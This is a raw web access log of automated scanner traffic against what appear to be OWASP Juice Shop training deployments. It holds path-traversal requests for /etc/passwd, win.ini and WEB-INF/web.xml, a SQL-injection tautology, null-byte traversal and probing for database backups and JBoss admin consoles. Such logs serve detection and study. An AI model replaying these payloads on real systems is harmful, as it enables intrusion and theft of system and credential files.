34.136.217.65 - - [04/Aug/2025:04:32:18 +0000] "GET /assets/public/css/styles.css HTTP/1.1" 200 80117 "https://demo.owasp-juice.shop/assets/public/css/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:18 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /juice-shop.herokuapp.com-dump.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /xHlPxwmspj.cgi HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:18 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:18 +0000] "GET /app/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:18 +0000] "POST /rest/user/login HTTP/1.1" 200 832 "https://demo.owasp-juice.shop/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /juice-shop.herokuapp.com-backup.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /xHlPxwmspj.pl HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /juice-shop.herokuapp.com_db.sql HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /xHlPxwmspj.plx HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:18 +0000] "GET /solr/admin/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /db.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /xHlPxwmspj.exe HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /dump.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /xHlPxwmspj.asp HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /dbdump.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /xHlPxwmspj.aspx HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:19 +0000] "GET /app/node_modules/express/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:19 +0000] "GET /app/node_modules/express/lib/router/index.js:421:3 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:19 +0000] "GET /assets/public/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:19 +0000] "GET /app/node_modules/express/lib/router/index.js:328:13 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /database.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:19 +0000] "GET /xHlPxwmspj.phtml HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:20 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:20 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:20 +0000] "GET /app/build/routes/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /backup.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:20 +0000] "GET /app/node_modules/express/lib/router/index.js:365:14 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /xHlPxwmspj.jhtml HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:20 +0000] "GET /app/node_modules/polyfills.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /juice.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /xHlPxwmspj.shtml HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /juicedb.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /xHlPxwmspj.nsf HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /xHlPxwmspj.cfm HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:20 +0000] "GET /juice_db.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
2001:ee0:8209:632:69fa:39ee:74cd:7e3a - - [04/Aug/2025:04:32:20 +0000] "GET /FUZZ/socket.io/?EIO=4&transport=polling&t=PXpMXJG HTTP/1.1" 200 - "https://demo.owasp-juice.shop/FUZZ" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /xHlPxwmspj.jsp HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /juice-db.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /juice_database.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /xHlPxwmspj.jspa HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:21 +0000] "GET /app/node_modules/express/lib/router/index.js:421:3 HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /juice-database.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /xHlPxwmspj.stm HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:21 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:21 +0000] "GET /app/node_modules/morgan/runtime.js HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /juice_dump.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /juice-dump.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:21 +0000] "GET /_vti_pvt/authors.pwd HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /juice_backup.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /9oMUw7EIEM.cfm HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /juice-backup.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /CFIDE/administrator/index.cfm HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /backup-juice.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /status?full=true HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:22 +0000] "GET /assets/public/images/ HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
34.136.217.65 - - [04/Aug/2025:04:32:22 +0000] "GET /assets/i18n/styles.css HTTP/1.1" 200 80117 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /backup_juice.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /web-console/status?full=true HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:22 +0000] "GET /wps/wcm/connect/'+or+'Ajshl'='Ajshl HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /juice-shop.herokuapp.com.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /manager/status/all HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /juice-shop.herokuapp.com-dump.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /Global.asa.bak HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /juice-shop.herokuapp.com-backup.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /Global.asax.bak HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /_vti_pvt/service.cnf HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /juice-shop.herokuapp.com_db.sql.gz HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /long_inexistent_path12345_/Null.htw?CiWebhitsfile=:&CiRestriction=b&CiHiliteType=full HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /web/database/manager HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
111.223.186.144 - - [04/Aug/2025:04:32:23 +0000] "GET /orders/socket.io/?EIO=4&transport=polling&t=PXpMXy- HTTP/1.1" 200 - "https://juice-shop.herokuapp.com/orders" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /db.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:23 +0000] "GET /web-console/Invoker HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /dump.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /web-console/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /../../../../../../../../../../windows/win.ini HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /../../../../../../../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /../WEB-INF/web.xml HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /%2e%2e%2fapp.js HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /WEB-INF/web.xml HTTP/1.1" 200 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /dbdump.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServerInfo HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /database.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServer HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=WEB-INF%2Fweb.xml HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=..%2FWEB-INF%2Fweb.xml HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=%3F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
44.193.23.252 - - [04/Aug/2025:04:32:24 +0000] "GET /redirect?to=%252e%252e%252fapp.js HTTP/1.1" 406 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.207 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /backup.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /jmx-console/ HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /invoker/JMXInvokerServlet HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:24 +0000] "GET /juice.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /invoker/EJBInvokerServlet HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /juicedb.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.deployer:service%3DBSHDeployer HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /juice_db.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
34.136.217.65 - - [04/Aug/2025:04:32:25 +0000] "GET /assets/public/css/styles.css HTTP/1.1" 200 80117 "https://demo.owasp-juice.shop/assets/public/css/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7204.100 Safari/537.36"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /jbossws/services HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /juice-db.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /horde/util/barcode.php?type=../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 200 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
49.36.97.128 - - [04/Aug/2025:04:32:25 +0000] "GET /juice_database.sql.tar HTTP/1.1" 206 - "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21"
